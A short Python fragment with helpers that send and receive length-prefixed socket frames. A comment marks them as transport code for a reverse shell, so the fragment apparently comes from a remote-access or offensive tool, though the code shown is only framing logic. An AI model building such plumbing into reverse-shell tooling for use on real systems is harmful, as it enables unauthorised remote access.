# ---------------------------------------------------------------------------
# Framing helper for stream transports (reverse shell etc.)
# ---------------------------------------------------------------------------
def rv2_frame_recv(sock, max_len=1 << 20):
    """Read one length-prefixed frame (4-byte BE header). Returns bytes or None on EOF."""
    hdr = b""
    while len(hdr) < 4:
        chunk = sock.recv(4 - len(hdr))
        if not chunk:
            return None
        hdr += chunk
    ln = struct.unpack(">I", hdr)[0]
    if ln > max_len:
        raise ValueError("frame too large")
    data = b""
    while len(data) < ln:
        chunk = sock.recv(min(65536, ln - len(data)))
        if not chunk:
            return None
        data += chunk
    return data


def rv2_frame_send(sock, payload):
    sock.sendall(struct.pack(">I", len(payload)) + payload)
